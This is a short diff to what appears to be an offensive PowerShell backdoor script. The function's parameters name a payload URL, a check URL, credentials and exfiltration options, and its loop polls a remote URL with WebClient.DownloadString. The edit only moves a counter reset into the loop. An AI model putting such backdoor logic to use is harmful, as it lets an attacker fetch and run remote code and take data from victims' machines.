@@ -137,9 +137,10 @@ function Execute-OnTime
  $body = @'
 function Logic-Execute-OnTime ($PayloadURL, $time, $CheckURL, $StopString, $ExfilOption, $dev_key, $username, $password, $URL, $DomainName, $AuthNS, $exfil)
 {
-    $exec = 0
+    
     while($true)
     {
+        $exec = 0
         start-sleep -seconds 5 
         $webclient = New-Object System.Net.WebClient
         $filecontent = $webclient.DownloadString("$CheckURL")
